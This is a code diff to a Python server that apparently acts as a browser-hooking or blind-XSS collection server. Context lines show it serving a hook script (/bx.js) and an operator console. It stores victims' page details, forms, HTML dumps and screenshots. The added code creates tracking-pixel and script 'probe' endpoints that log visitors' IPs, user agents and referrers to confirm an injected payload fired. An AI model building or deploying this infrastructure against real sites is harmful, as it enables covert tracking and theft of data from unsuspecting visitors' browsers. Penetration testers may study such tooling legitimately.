@@ -34,6 +34,7 @@ SSE     = {}   # id → [wfile]                현재 연결된 SSE (단일 채�
 # v0.2
 NET     = {}   # id → [{method,url,status,body,ms,t}]  최근 100
 PROXY   = {}   # rid → [{n,total,body,status,url,t}]   청크 조립용
+PROBES  = []   # /bx.js · /probe* 로드 기록 — 연결성 확인 (RequestBin 스타일)
 # v0.3 — 자동 수집
 PAGEINFO   = {}   # vid → {referrer,lang,platform,screen,viewport,ss,meta,forms}
 HTMLDUMP   = {}   # vid → {"chunks":{n:str}, "total":int, "assembled":str}
@@ -324,6 +325,23 @@ def _stale_watcher():
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a): pass
+    def _record_hit(self, path):
+        """probe/bx.js 로드 기록 — 트리거 확인용 (RequestBin 스타일)."""
+        now = time.strftime("%H:%M:%S")
+        xfp = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip().lower()
+        proto = xfp or ("https" if isinstance(self.connection, ssl.SSLSocket) else "http")
+        row = {"t": now, "ip": self.client_address[0],
+               "ua": (self.headers.get("User-Agent") or "")[:200],
+               "referer": (self.headers.get("Referer") or "")[:300],
+               "dest": (self.headers.get("Sec-Fetch-Dest") or "")[:40],
+               "site": (self.headers.get("Sec-Fetch-Site") or "")[:40],
+               "proto": proto, "path": path[:300]}
+        with LOCK:
+            PROBES.append(row)
+            del PROBES[:-100]
+        evidence({"t": time.strftime("%FT%T"), "tag": "probe", "id": "hit",
+                  "data": {k: (v[:120] if isinstance(v, str) else v) for k, v in row.items()}})
+
     def _send(self, code, ctype, body, no_store=False):
         self.send_response(code)
         self.send_header("Content-Type", ctype)
@@ -343,6 +361,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         u = urllib.parse.urlparse(self.path); p, q = u.path, urllib.parse.parse_qs(u.query)
         if p == "/bx.js":
+            self._record_hit(self.path)
             host = self.headers.get("Host", f"127.0.0.1:{PORT}")
             # 스킴 자동 감지 — https 페이지에서 mixed content 차단 방지
             # (역프록시: X-Forwarded-Proto / 직접 TLS: SSLSocket / 기본: http)
@@ -437,8 +456,22 @@ class Handler(http.server.BaseHTTPRequestHandler):
                       "shot_t": {k: (v.get("t") or "") for k, v in SCREENSHOT.items()},
                       "html_t": {k: (v.get("t") or "") for k, v in HTMLDUMP.items()},
                       # 휴지통 (soft delete — 복원 가능)
-                      "trash": TRASH}
+                      "trash": TRASH,
+                      "probes_count": len(PROBES)}
             self._send(200, "application/json", json.dumps(st, ensure_ascii=False).encode())
+        elif p in ("/probe", "/probe.js", "/probe.css"):
+            self._record_hit(self.path)
+            if p == "/probe.js":
+                self._send(200, "application/javascript", b"1;")
+            elif p == "/probe.css":
+                self._send(200, "text/css", b"")
+            else:
+                _gif = base64.b64decode(
+                    "R0lGODlhAQABAIAAAAAAAP///yH5BAAAAAAALAAAAAABAAEAAAIBRAA7")
+                self._send(200, "image/gif", _gif)
+        elif p == "/api/probes":
+            with LOCK:
+                self._send(200, "application/json", json.dumps(list(PROBES), ensure_ascii=False).encode())
         elif p == "/bxconsole":
             self._send(200, "text/html", open(OPHTML).read().encode())
         elif p == "/op":
@@ -582,6 +615,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
             if tag != "beat":
                 evidence({"t": time.strftime("%FT%T"), "tag": tag, "id": vid, "data": d})
             self._send(200, "text/plain", b"ok")
+        elif p == "/api/probes/clear":
+            with LOCK:
+                del PROBES[:]
+            self._send(200, "application/json", b'{"ok":true}')
         elif p == "/api/net/clear":
             try: d = json.loads(raw)
             except Exception: d = {}
